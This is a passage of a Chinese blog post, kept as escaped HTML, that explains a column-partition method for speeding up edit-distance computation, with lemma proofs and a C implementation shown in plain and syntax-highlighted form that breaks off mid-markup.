src=\"http://jbcdn2.b0.upaiyun.com/2018/08/ca2bb74d5294b193a24d25247dcdaef3.png\"></p>\n<p>所以，我们按照这个定义，就可以对编辑矩阵的每列进行一个划分，划分的每一段都是一串连续数字。</p>\n<p><strong>说了这么多，这个定义有什么用呢？假若，我们每次都能根据前一列的列划分情况直接推导出后一列的列划分情况，那么就可以省去好多计算，毕竟每一个划分中的每一段的数字都是连续的，这就暗示我们可以直接用一个常数时间的加法直接得到某一个编辑矩阵的元素值，而不用使用最小编辑距离的动态规划算法去计算。</strong></p>\n<p>接下来的重点来了，我们介绍这个推导公式，请打起十二分精神！我们按照序列-δ长度是否为0来介绍这个推论。由于其中一个推论文字描述太繁琐，不容易理解，所以我画了个图：<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/0ff49e40437cc4c0f2497a451564da25.png\"></p>\n<p>接下来烧脑开始。</p>\n<blockquote>\n<p id=\"推论1如果列i上长度为0的-序列-δ-的结束位置为j则列i1上的-序列-δ-的结束位置为-j1\">推论1：如果列i上长度为0的 序列-δ 的结束位置为j，则列i+1上的 序列-δ 的结束位置为 j+1。</p>\n</blockquote>\n<p><strong>证明</strong> ：由推论前提我们知道 δ = j – D[j][i] + 1 （想想前面说的δ值不连续，我们就人为插入一个中间值，只不过长度为0）。<br>\n我们观察编辑矩阵就会发现如下两个事实：</p>\n<ul>\n<li>事实1：D[j+1][i+1] = D[j][i] （ 别问为什么， 自己观察， 看看是不是都这样， 其实可以用反证法，我们就不证明了）。</li>\n<li>事实2：D[j+2][i+1] &lt;= D[j][i]。</li>\n</ul>\n<p>通过事实1，我们知道D[j+1][i+1]确实属于 序列-δ，因为 j + 1 – D[j+1][i+1] = j + 1 – D[j][i] = δ。</p>\n<p>通过事实2，我们知道列i+1上的序列δ，终止位置为j+1。</p>\n<p>所以推论1证明结束。</p>\n<blockquote>\n<p id=\"推论2-文字描述略请看图\">推论2： 文字描述略，请看图</p>\n</blockquote>\n<p><strong>证明</strong> ：</p>\n<ul>\n<li>设这个序列长度为L，除了每列的第一个序列外，其余序列的其余位置均是当前的编辑距离小于等于该列上一个位置的编辑距离：即D[j-L+1][i]&lt;=D[j-L][i]，所以，我们可以推出：D[j-L+1][i] &lt;= D[j-L][i];</li>\n<li>再根据编辑矩阵对角线非递减我们知道，D[j-L+1][i+1] &gt;= D[j-L][i];</li>\n</ul>\n<p>综上两点我们得到如下大小关系：D[j-L+1][i+1] &gt;= D[j-L+1][i]。</p>\n<p>此外我们知道我们当前列的序列-δ截止位置为j，也意味着D[j+1][i] &lt;= D[j][i]，同样根据对角线法则，我们得出D[j+2][i+1] &lt;= D[j+1][i] + 1 &lt;= D[j][i] + 1。</p>\n<p>接下来到了最精彩的一步，我们知道列i当前序列-δ内的值是连续的，如果起始编辑距离为A，那么终止编辑距离为A+L-1。</p>\n<p>而由我们的推导可以发现：D[j-L+1][i+1] &gt;= A，D[j+2][i+1] &lt;= (A+L-1) + 1 = A+L，而之间跨越的长度为 (j+2)-(j-L+1)+1= L+2。 我们可以推出列i+1上从行j-L+1到行j+2之间的序列一定不连续，否则D[j+2][i+1] &gt;= A+L+2-1= A+L+1，与我们先前的推导矛盾。所以，在j-L+1和j+2之间一定有一个列终止，这样才能消去一个序号。</p>\n<blockquote>\n<p id=\"此外我们还有一个疑问列i1上的序列-δ结束位置一定在j-l1和j1之间么我们要证明这个事\">此外我们还有一个疑问，列i+1上的序列-δ结束位置一定在j-L+1和j+1之间么？我们要证明这个事。</p>\n</blockquote>\n<p><strong>证明</strong> ：</p>\n<p>因为δ=j-D[j][i]=j-L+1-D[j-L+1][i]&gt;=j-L+1-D[j-L+1][i+1]，即列i+1上的 序列-δ的结束位置一定在j-L+1或者之后；</p>\n<p>由于j+1-D[j+1][i]&gt;δ，根据对角线法则D[j+2][i+1] &lt;= D[j+1][i]+1，有j+2-D[j+2][i+1]&gt;=j+2-(D[j+1][i]+1)=j+1-D[j+1][i] &gt; δ， 固列i+1上的序列-δ的终止位置一定在j+2之前，即j-L+1到j+1之间。</p>\n<p>后面推论2的分情况讨论，我一个也没证明出来，作者在论文中轻飘飘的一句话“后面很好证明，他就不去证明了”，但是却消耗了我所有脑细胞。所以，如果哪位小伙伴把推论2剩下的内容证明出来了，欢迎给我留言，我也学习学习。</p>\n<p>这个算法的时间复杂度是多少呢？作者用启发式的方法证明了算法的复杂度约为$ O(mn/sqrt[2]{b}) $，其中b是字符集大小。</p>\n<h4 id=\"代码实现\">代码实现</h4>\n<p>接下来说一下代码实现，给出我总结出来的步骤，否则很容易踩坑。</p>\n<ul>\n<li>编辑矩阵第一列，肯定只有一个序列。</li>\n<li>每次遍历前一列的所有序列，根据推论1和推论2计算后一列的划分情况。</li>\n<li>如果前一列遍历完毕，但是下一列还有剩余的元素没有划分。没关系，下一列剩下的元素都归为一个新的序列。</li>\n<li>预处理一个表，表中记录T中的每个字符在P中的位置。可以直接用哈希算法（最好直接ascii码）进行定位，如果位置不唯一，可以拉链。进行列划分计算时，从前往后遍历那一链上的位置，直到找到第一个符合条件的，速度出奇的快。尽可能少使用或者不要使用map进行定位，测试发现相当慢。</li>\n</ul>\n<p>接下来做最不愿意做的事：贴一个代码，很丑。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66f2a3c95038091181\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ninline int loc(int find[][200], int *len, int ch, int pos) {\r\n  for(int i = 0; i &lt; len[ch]; ++i) {\r\n    if(find[ch][i] &gt;= pos)  return find[ch][i];\r\n  }\r\n  return -1;\r\n}\r\n\r\nint new_column_partition(char *p, char *t) {\r\n  int len_p = strlen(p);\r\n  int len_t = strlen(t);\r\n  int find[26][200];\r\n  int len[26] = {0};\r\n  int part[200];  //记录每一个序列的结束位置\r\n  //生成loc表，用来快速查询\r\n  for(int i = 0; i &lt; len_p; ++i) {\r\n    find[p[i] - 'a'][len[p[i] - 'a']++] = i + 1;\r\n  }\r\n  \r\n  int pre_cn = 0, next_cn = 1, min_v = len_p;\r\n  part[0] = len_p;\r\n  \r\n  for(int i = 0; i &lt; len_t; ++i) {\r\n    //前一列partition数\r\n    pre_cn = next_cn;\r\n    next_cn = 0;\r\n    int l = part[0] + 1;\r\n    int b = 1;\r\n    int e = l;\r\n    int tmp;\r\n    int tmp_value = 0;\r\n    int pre_v = part[0];\r\n    //前一列第0个partition长度肯定&gt;=1\r\n    if(len[t[i] - 'a'] &gt;0 &amp;&amp; (tmp = loc(find, len, t[i] - 'a', b)) != -1 &amp;&amp; tmp &lt;= e) {\r\n      part[next_cn++] = tmp - 1;\r\n    } else if(pre_cn &gt;= 2 &amp;&amp; part[1] - part[0] != 0){\r\n      part[next_cn++] = part[0] + 1;\r\n    } else {\r\n      part[next_cn++] = part[0];\r\n    }\r\n    //每列第一个partition尾值\r\n    tmp_value = part[0];\r\n\r\n    //遍历前一列剩下的partition\r\n    for(int j = 1; j &lt; pre_cn &amp;&amp; part[next_cn - 1] &lt; len_p; ++j) {\r\n      int x = part[j], y = pre_v;\r\n      pre_v = part[j];\r\n      l = x - y;\r\n      if(l == 0) {\r\n        part[next_cn++] = x + 1;\r\n      } else {\r\n        b = x - l + 2;\r\n        e = x + 1;\r\n        if(b &lt;= len_p &amp;&amp; len[t[i] - 'a'] &gt; 0 &amp;&amp; (tmp = loc(find, len, t[i] - 'a', b)) != -1 &amp;&amp; tmp &lt;= e) {\r\n          part[next_cn++] = tmp - 1;\r\n        } else if(j + 1 &lt; pre_cn &amp;&amp; part[j + 1] - x != 0) {\r\n          part[next_cn++] = x + 1;\r\n        } else {\r\n          part[next_cn++] = x;\r\n        }\r\n      }\r\n      l = part[j] - part[j - 1];\r\n      if(l == 0) {\r\n        //新得到的partition长度为0，那么下一个partition的起始值比上一个partition尾值少1\r\n        tmp_value -= 1;\r\n      } else {\r\n        tmp_value += l - 1;\r\n      }\r\n    }\r\n    \r\n    if(part[next_cn - 1] != len_p) {\r\n      part[next_cn++] = len_p;  \r\n      tmp_value += len_p - part[next_cn - 2] - 1;\r\n      if(tmp_value &lt; min_v) {\r\n        min_v = tmp_value;\r\n      }\r\n    } else {\r\n      min_v = min_v &lt; tmp_value ? min_v : tmp_value;\r\n    }\r\n  }\r\n  return min_v;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-55\">55</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-56\">56</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-57\">57</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-58\">58</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-59\">59</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-60\">60</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-61\">61</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-62\">62</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-63\">63</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-64\">64</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-65\">65</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-66\">66</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-67\">67</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-68\">68</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-69\">69</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-70\">70</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-71\">71</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-72\">72</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-73\">73</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-74\">74</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-75\">75</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-76\">76</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-77\">77</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-78\">78</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-79\">79</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab66f2a3c95038091181-80\">80</div><div class=\"crayon-num\" data-line=\"crayon-5bab66f2a3c95038091181-81\">81</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-1\"><span class=\"crayon-e\">inline </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">loc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">find</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">200</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">len</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ch</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pos</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-2\"><span class=\"crayon-h\">  </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">ch</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">find</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">ch</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pos</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">find</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">ch</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-4\"><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-5\"><span class=\"crayon-h\">  </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-6\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-8\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">new_column_partition</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">p</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">t</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-9\"><span class=\"crayon-h\">  </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len_p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">strlen</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">p</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-10\"><span class=\"crayon-h\">  </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len_t</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">strlen</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">t</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-11\"><span class=\"crayon-h\">  </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">find</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">26</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">200</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-12\"><span class=\"crayon-h\">  </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">26</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-13\"><span class=\"crayon-h\">  </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">200</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span><span class=\"crayon-c\">//记录每一个序列的结束位置</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-14\"><span class=\"crayon-h\">  </span><span class=\"crayon-c\">//生成loc表，用来快速查询</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-15\"><span class=\"crayon-h\">  </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len_p</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-16\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">find</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">p</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'a'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">len</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">p</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'a'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-17\"><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-18\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-19\"><span class=\"crayon-h\">  </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pre_cn</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">next_cn</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">min_v</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len_p</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-20\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">part</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len_p</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-21\"><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-22\"><span class=\"crayon-h\">  </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len_t</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab66f2a3c95038091181-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">//前一列partition数</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab66f2a3c95038091181-24\"><span class=\"crayon-h\">    </span><span 